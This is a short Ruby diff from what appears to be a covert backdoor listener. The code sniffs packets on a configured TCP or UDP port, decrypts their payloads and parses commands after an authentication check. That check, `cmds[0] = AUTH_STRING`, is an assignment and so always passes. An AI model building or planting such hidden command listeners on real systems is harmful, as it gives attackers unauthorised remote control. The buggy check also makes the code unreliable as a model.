@@ -79,13 +79,8 @@ def start_listen_server
       :filter => filter)
     cap.stream.each do |p|
       pkt =  PacketFu::Packet.parse(p)
-      if $cfg_pen_protocol == TCP && pkt.udp_dst == $cfg_pen_port
-        puts "in TCP mode" #DEBUG
-        #check for auth
-        #if auth'd parse payload for command
-        #do command
-      elsif $cfg_pen_protocol == UDP && pkt.udp_dst == $cfg_pen_port
-        puts "in UDP mode" #DEBUG
+      if ($cfg_pen_protocol == TCP && pkt.tcp_dst == $cfg_pen_port) \
+        || ($cfg_pen_protocol == UDP && pkt.udp_dst == $cfg_pen_port)
         payload = decrypt(pkt.payload)
         cmds = payload.split(' ')
         if cmds[0] = AUTH_STRING
